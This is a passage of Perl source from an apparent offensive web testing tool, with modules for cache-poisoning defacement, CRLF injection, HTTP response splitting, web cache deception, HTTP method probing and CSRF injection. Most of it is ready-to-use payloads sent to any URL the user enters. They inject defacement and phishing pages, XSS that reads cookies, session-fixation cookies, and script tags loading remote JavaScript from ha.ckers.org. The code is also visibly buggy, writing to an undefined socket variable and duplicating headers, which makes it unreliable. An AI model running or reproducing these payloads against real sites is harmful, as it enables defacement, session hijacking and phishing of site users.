                                ) or die "Could not create ssecure ocket: $!\n" unless $sock;                                
print $sock "GET $filename HTTP/1.0\r\n";
print $sock "Host: $hosta\r\n";
print $sock "Host: $hostb\r\n";
print $sock "Accept: /\r\n\r\n";
print $sock "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n\r\n";
print $sock "Connection: close\r\n\r\n";
print $sock "Referer: 'http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5'\r\n\r\n";

print while <$sock>;
close($sock);
}

if ($enter =~3) {
	print item(), "Enter URL : ";
	chomp($url=<STDIN>);
	print item(), "Enter File Name: ";
	chomp($filename=<STDIN>);	
	print item(), "Enter Host A: ";
	chomp($hosta=<STDIN>);
	print item(), "Enter Host B: ";
	chomp($hostb=<STDIN>);
	print "\n";
#use IO::Socket;
#my $sock = new IO::Socket::INET (
use IO::Socket::SecureSocks;
my $socket = IO::Socket::SecureSocks->new(
                                 PeerAddr => $url,
                                 PeerPort => '443',
                                 Proto => 'tcp',
                                 Timeout     => 10
                                ) or die "Could not create ssecure ocket: $!\n" unless $sock;                                
print $sock "GET $filename HTTP/1.0\r\n";
print $sock "Host: $hosta\r\n";
print $sock "Host: $hostb\r\n";
print $sock "Proxy-Connection: keep-alive\r\n";
print $sock "Accept: /\r\n\r\n";
print $sock "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n\r\n";
print $sock "Connection: close\r\n\r\n";
print $sock "Referer: 'http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5'\r\n\r\n";

print while <$sock>;
close($sock);
}
	
	if ($enter =~4) {
	print item(), "Enter URL: ";
	chomp($url=<STDIN>);
	print item(), "Enter Host: ";
	chomp($host=<STDIN>);
	print "\n";
#use IO::Socket;
#my $sock = new IO::Socket::INET (
use IO::Socket::SecureSocks;
my $socket = IO::Socket::SecureSocks->new(
                                 PeerAddr => $url,
                                 PeerPort => '443',
                                 Proto => 'tcp',
                                 Timeout     => 10
                                ) or die "Could not create ssecure ocket: $!\n" unless $sock;
print $sock "GET / HTTP/1.0\r\n";
print $sock "Host: $host\r\n";
print $sock "Accept: /\r\n\r\n";
print $sock "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n\r\n";
print $sock "Connection: close\r\n\r\n";
print $sock "Referer: 'http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5'\r\n\r\n";

print while <$sock>;
close($sock);


}
}
}


#-----------------------------------------------#
# 10 Cache Poison Defacer                       #
#                                               #
#-----------------------------------------------#
sub C ( ) {
	print "\n";
	print item(), "Caution\n";
	print item(), "For HTTPS, use Local Proxy\n";
	print item(), "Url should have open redirect\n";
	print item(), "Files such as redirect.php or redir.php or similar\n";
	print item(),"Enter URL: ";
	chomp($url=<STDIN>);
	print item(),"Enter File name: ";
	chomp($filename=<STDIN>);
	my $special = "https://www.google.com";
	print item(),"Server Response \n";
	my $req = HTTP::Request->new( GET => "$url$filename%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1GET http://$url$filename%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();
if( $res->as_string () =~ m/deface/ ) {
	print color("BOLD WHITE"), "[ + ] Reflection found, do confirm manually", "\n";
	print color("reset");
	}
	else {
	print color("BOLD RED"), "\n[ ~ ] Reflection not found \n";
	print color("reset"); }
	print item(), "Continue to Payload number 2", "\n";
    print item(), "Press <Enter> or <Return> to continue: ";
    my $resp = <STDIN>;
	print item(),"Server Response \n";
	my $req = HTTP::Request->new( GET => "$url$filename\//google.com/..;/css HTTP/1.1" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
if( $res->as_string () =~ m/google.com/ ) {
	print color("BOLD WHITE"), "[ + ] Reflection found, do confirm manually", "\n";
	print color("reset");
	}
	else {
	print color("BOLD RED"), "\n[ ~ ] Reflection not found \n";
	print color("reset"); }
	print item(), "Continue to Payload number 3", "\n";
	print item(), "Press <Enter> or <Return> to continue: ";
	my $resp = <STDIN>;
	print item(),"Server Response \n";
	my $req = HTTP::Request->new( GET => "http://$url$filename%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
if( $res->as_string () =~ m/google.com/ ) {
	print color("BOLD WHITE"), "[ + ] Reflection found, do confirm manually", "\n";
	print color("reset");
	}
	else {
	print color("BOLD RED"), "\n[ ~ ] Reflection not found \n";
	print color("reset"); }
	print item(), "Continue to Payload number 3", "\n";
	print item(), "Press <Enter> or <Return> to continue: ";
	my $resp = <STDIN>;
	print item(),"Server Response \n";
	my $req = HTTP::Request->new( GET => "$url$filename$special/javascript:alert(1)/" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();   
if( $res->as_string () =~ m/alert/ ) {
	print color("BOLD WHITE"), "[ + ] Reflection found, do confirm manually", "\n";
	print color("reset");
	}
	else {
print color("BOLD RED"), "\n[ ~ ] Reflection not found \n";
print color("reset");
}
print item(), "Continue to Payload number 3", "\n";
	print item(), "Press <Enter> or <Return> to continue: ";
	my $resp = <STDIN>;
	print item(),"Server Response \n";
	my $req = HTTP::Request->new( GET => "$url/google.com/google.com/" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();   
if( $res->as_string () =~ m/google/ ) {
	print color("BOLD WHITE"), "[ + ] Reflection found, do confirm manually", "\n";
	print color("reset");
	}
	else {
print color("BOLD RED"), "\n[ ~ ] Reflection not found \n";
print color("reset");
}
print item(), "Continue to Payload number 4", "\n";
	print item(), "Press <Enter> or <Return> to continue: ";
	my $resp = <STDIN>;
	print item(),"Server Response \n";
	my $req = HTTP::Request->new( GET => "$url/google.com/google.com/" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();   
if( $res->as_string () =~ m/google/ ) {
	print color("BOLD WHITE"), "[ + ] Reflection found, do confirm manually", "\n";
	print color("reset");
	}
	else {
print color("BOLD RED"), "\n[ ~ ] Reflection not found \n";
print color("reset");
}
print item(), "Continue to Payload number 5", "\n";
	print item(), "Press <Enter> or <Return> to continue: ";
	my $resp = <STDIN>;
	print item(),"Server Response \n";
	my $req = HTTP::Request->new( GET => "$url/index.php/google.com" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();   
if( $res->as_string () =~ m/google/ ) {
	print color("BOLD WHITE"), "[ + ] Reflection found, do confirm manually", "\n";
	print color("reset");
	}
	else {
print color("BOLD RED"), "\n[ ~ ] Reflection not found \n";
print color("reset");
}
}


#-----------------------------------------------#
# 11 CRLF Injection and Poison Fuzzer           #
#                                               #
#-----------------------------------------------#
sub Crlfrsaf ( ) {
	print "\n";
	print item(),"Enter URL: ";
	chomp($url=<STDIN>);
	print item(),"Server Response \n";
	my $req = HTTP::Request->new( GET => "$url%0d%0a<script>alert(document.domain)</script>" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0d%0a%0a<script>alert(document.domain)</script>" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url'0x0D0x0A<script>alert(document.domain)</script>'" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url'0x0D0x0D0x0A0x0A<script>alert(document.domain)</script>'" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url\r\n<script>alert(document.domain)</script>" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%5cr%5cn<script>alert(document.domain)</script>" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0%0d%0ad%0%0d%0aa<script>alert(document.domain)</script>" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0%0D%0AD%0%0D%0AA<script>alert(document.domain)</script>" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Ccenter%3E%3Ch1%3EHacked%3C/h1%3E%3C/center%3E" );
	my $res = $ua->request($req);
	print $res->as_string ();
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E" );
	my $res = $ua->request($req);
	print $res->as_string ();  
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();
	my $req = HTTP::Request->new( GET => "$url%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();
	my $req = HTTP::Request->new( GET => "$url%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();
	my $req = HTTP::Request->new( GET => "$url%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%%0a0aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0dSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0dSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%23%0d%0aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();
	my $req = HTTP::Request->new( GET => "$url%23%0dSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();    
	my $req = HTTP::Request->new( GET => "$url%25%30%61Set-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();    
	my $req = HTTP::Request->new( GET => "$url%25%30aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();    
	my $req = HTTP::Request->new( GET => "$url%250aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();    
	my $req = HTTP::Request->new( GET => "$url%25250aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();    
	my $req = HTTP::Request->new( GET => "$url%2e%2e%2f%0d%0aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();    
	my $req = HTTP::Request->new( GET => "$url%2f%2e%2e%0d%0aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();
	my $req = HTTP::Request->new( GET => "$url%2F..%0d%0aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();        
	my $req = HTTP::Request->new( GET => "$url%3f%0dSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();        
	my $req = HTTP::Request->new( GET => "$url%u000aSet-Cookie:crlf=injection" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();                
	my $req = HTTP::Request->new( GET => "$url%2f%2e%2e%0d%0aheader:header" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();                
	my $req = HTTP::Request->new( GET => "$url%2e%2e%2f%0d%0aheader:header" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();                
	my $req = HTTP::Request->new( GET => "$url%2F..%0d%0aheader:header" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();        
	my $req = HTTP::Request->new( GET => "$url%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();        
	my $req = HTTP::Request->new( GET => "$url%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();        
	my $req = HTTP::Request->new( GET => "$url%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();        
	my $req = HTTP::Request->new( GET => "$url%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();
	my $req = HTTP::Request->new( GET => "$url%0d%0aSet-Cookie:%20ASPSESSIONIDACCBBTCD=SessionFixed%0d%0a" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();        	       
if( $res->as_string () =~ m/test.com/ ) {
	print color("BOLD WHITE"), "[ + ] Reflection found for word test.com, do confirm manually", "\n";
	print color("reset");
	}
elsif ( $res->as_string () =~ m/rel='canonical'/ ) {
print color("BOLD WHITE"), "\n\n[ + ] The result could be canonical and false positive", "\n";
print color("reset");
}
elsif ($res->as_string () =~ m/alert/ ) {
print color("BOLD MAGENTA"), "\n[ ! ] Reflection found for word alert, do confirm manually \n";
print color("reset");
}

elsif ($res->as_string () =~ m/Set-Cookie:crlf=injection/ ) {
print color("BOLD MAGENTA"), "\n[ ! ] Reflection found for word Set-Cookie:crlf=injection, do confirm manually \n";
print color("reset");
}
elsif ($res->as_string () =~ m/ha.ckers.org/ ) {
print color("BOLD MAGENTA"), "\n[ ! ] Reflection found for word ha.ckers.org, do confirm manually \n";
print color("reset");
}
	else {
print color("BOLD RED"), "\n[ ~ ] Reflection not found \n";
print color("reset");
}
}


#-----------------------------------------------#
# 12 HTTP Response Smuggling Attack & Fuzzer    #
#                                               #
#-----------------------------------------------#
sub Httprsf ( ) {
	print item(), "Caution: Note that HTTP Smuggling does *not* exploit any vulnerability in the target web application.
	      Therefore, it can be difficult to convince the client for countermeasures\n\n";
print item(), "Enter URL: ";
chomp($url=<STDIN>);
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
    my $req = HTTP::Request->new( GET => "$url%0d%0aSet-Cookie:%20HTTP_response_splitting%3dYES%0d%0aFoo:%20bar" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0aSet-Cookie:%20HTTP_response_splitting%3dYES%0aFoo:%20bar" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string (); 
	my $req = HTTP::Request->new( GET => "$url%0dSet-Cookie:%20HTTP_response_splitting%3dYES%0dFoo:%20bar" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();
	my $req = HTTP::Request->new( GET => "$url%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>" );
	my $res = $ua->request($req);
	print $res->as_string (); 
	print item(),"Requested Data \n";
	print $req->as_string ();    
	print item(), "\n";
	$| = 1; # Clear the buffer here
	print item(),"Starting Curl Based Payloads \n";
	sleep 5;	
	system "curl '$url' --data-bbinary @request"; # curl based buffer exploit for IIS servers

if ( $res->as_string () =~ m/rel='canonical'/ ) {
print color("BOLD WHITE"), "\n\n[ + ] The result could be canonical and false positive", "\n";
print color("reset");
}
elsif( $res->as_string () =~ m/haroons.com/ ) {
print color("BOLD WHITE"), "\n\n[ + ] Reflection found for word haroons.com of regex, do confirm manually", "\n";
print color("reset");
}
elsif( $res->as_string () =~ m/Sorry,/ ) {
print color("BOLD WHITE"), "\n\n[ + ] Reflection found for word Sorry, of regex, do confirm manually", "\n";
print color("reset");
}
elsif ( $res->as_string () =~ m/splitting/ ) {
print color("BOLD WHITE"), "\n\n[ + ] Reflection found for word splitting fo regex, do confirm manually","\n";
print color("reset");
}
else {
print color("BOLD RED"), "\n\n[ ~ ] Reflection not found \n";
print color("reset");
}
}


#-----------------------------------------------#
# 13 Web Cache Deception Attack Check           #
#                                               #
#-----------------------------------------------#
sub Wcdac ( ) {
	print item(), "Caution: Attack Requirements
	      1. 404 Error Page when attacker visit any non existant page with redirected tabs of Web/Server
	      2. Cache header should or should not be missing in few cases
	      3. Logged or Authenitcated in connected realm to find cached data
	      4. If all condition gets satisfy, go incognito & check cached file\n";	      
	sleep 12;
if (system("./browercachechecker.sh") == 0) {
	print item(), "success!\n";
	}
	else {
	print "\n",item(),"Make browercachechecker.sh in same folder\n";
	print "\n",item(),"Command failed\n";
	}
}

#-----------------------------------------------#
# 14  HTTP Methods Information                  #
#                                               #
#-----------------------------------------------#
sub Httpmethodsinformation ( ) {
$| = 1; # Clear the buffer here
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
print "\n",item(),"Checking PUT for File Upload\n";
my $req = POST($bbhmi, Content => [param => 'hello']);
my $res = $ua->request($req);
$req->method('PUT');
print item(),"Requested Data \n";
print $req->as_string ();    
print item(),"Response Data \n";
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";	
if( $res->as_string () =~ m/1.1 200 OK/gi ) {
	print item(), "Reflection found of HTTP 200 OK, do confirm manually", "\n";
    print item(), "Press <Enter> or <Return> to continue: ";
    my $resp = <STDIN>;
    }    

$| = 1; # Clear the buffer here    
print "\n",item(),"Checking PUT for File Upload Another Method\n";
system "curl -T filename.txt $bbhmi";
if( $res->as_string () =~ m/1.1 200 OK/gi ) {
	print "\n";
	print item(), "Reflection found of HTTP 200 OK, do confirm manually", "\n";
    print item(), "Press <Enter> or <Return> to continue: ";
    my $resp = <STDIN>;
    }    

$| = 1; # Clear the buffer here        
print "\n",item(),"Checking HEAD for Header Injections\n";
my $req = HTTP::Request->new(HEAD => $bbhmi);
print item(),"Requested Data \n";
print $req->as_string ();    
print item(),"Response Data \n";
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";	
if( $res->as_string () =~ m/1.1 200 OK/gi ) {
	print item(), "Reflection found of HTTP 200 OK, do confirm manually", "\n";
    print item(), "Press <Enter> or <Return> to continue: ";
    my $resp = <STDIN>;
    }    

$| = 1; # Clear the buffer here    
print "\n",item(),"Checking TRACE for Cross Site Tracing\n";
my $req = HTTP::Request->new(TRACE => $bbhmi);
print item(),"Requested Data \n";
print $req->as_string ();    
print item(),"Response Data \n";
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";	
system "curl -v -X TRACE -H 'Header: value=Testing' $bbhmi/";
if( $res->as_string () =~ m/1.1 200 OK/gi ) {
	print item(), "Reflection found of HTTP 200 OK, do confirm manually", "\n";
    print item(), "Press <Enter> or <Return> to continue: ";
    my $resp = <STDIN>;
    }    

$| = 1; # Clear the buffer here        
print "\n",item(),"Checking Options Bleed with Output\n";
if (system("./optionsbleed.sh") == 0) {
	print item(), "success!\n";
	}
	else {
	print "\n",item(),"Make optionsbleed.sh in same folder\n";
	print "\n",item(),"Command failed\n";
}	
	if( $res->as_string () =~ m/1.1 200 OK/gi ) {
	print "\n";
	print item(), "[ + ] Reflection found of HTTP 200 OK, do confirm manually", "\n";
	print item(), "Press <Enter> or <Return> to continue: ";
    my $resp = <STDIN>;
    }
}



#-----------------------------------------------#
# 15 CSRF - CSRF Injection					    #
#                                               #
#-----------------------------------------------#
sub Csrfinjection ( ) {
	$| = 1; # Clear the buffer here
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
	print "\n";
	print item(),"Enter URL: ";
	chomp($url=<STDIN>);
	print item(),"Enter File Name: ";
	chomp($filename=<STDIN>);	   
	print item(),"Enter Attacker Web: ";
	chomp($attacker=<STDIN>);	   
	print item(),"Enter Attacker Web File Name: ";
	chomp($attackerfile=<STDIN>);	   
	print item(),"Enter Cookie or leave blank: ";
	chomp($cookie=<STDIN>);	   
	print item(),"Enter Parameter1: ";
	chomp($param1=<STDIN>);	   
	print item(),"Enter Parameter1 value: ";
	chomp($paramv1=<STDIN>);	   
	print item(),"Enter Parameter2: ";
	chomp($param2=<STDIN>);	   
	print item(),"Enter Parameter2 value: ";
	chomp($paramv2=<STDIN>);	   

use IO::Socket;
my $sock = new IO::Socket::INET (
                                 PeerAddr => $url,
                                 PeerPort => '80',
                                 Proto => 'tcp',
                                );
die "Could not create socket: $!\n" unless $sock;
print $sock "POST /$filename HTTP/1.1\r\n\r\n";
print $sock "Host: $url\r\n\r\n";
print $sock "Origin: $attacker\r\n\r\n";
print $sock "Referer: $attacker/$attackerfile\r\n\r\n";
print $sock "Cookie: SESSION=$cookie\r\n\r\n";
print $sock "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
print $sock "POST /$filename HTTP/1.1\r\n\r\n";
print $sock "$values\r\n\r\n";

#echo -e "HEAD / HTTP/1.1\nHost: 10.1.1.2\nConnection: close\n\n\n\n" | netcat 10.1.1.2 80
#echo -e "POST / HTTP/1.1\nHost: google.com\nOrigin: google.com\nReferer: google.com\n Cookie: SESSION=\nContent-Type: application/x-www-form-urlencoded\nhi=hi\n\n\n\n" | netcat 10.1.1.2 80


print while <$sock>;
close($sock);



}


#-----------------------------------------------#
# 16 CSRF Templates - CSRF Templates		#
#                                               #
#-----------------------------------------------#
sub Loadcsrfhtmltemplates ( ) {
	print "\n";
	print item(), "Information:\n";
	print item(), "Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces\n";
	print item(), "an end user to execute unwanted actions on a web application in which they are\n"; 
	print item(), "currently authenticated. CSRF attacks specifically target state-changing requests\n"; 
	print item(), "not theft of data, since the attacker has no way to see the response to the forged request\n\n";
	print item(),"\n\nTemplates";			
	print item(),"1 - HTML GET - Requiring User Interaction\n";
	print item(),"2 - HTML GET - No User Interaction\n";
	print item(),"3 - HTML POST - Requiring User Interaction\n";
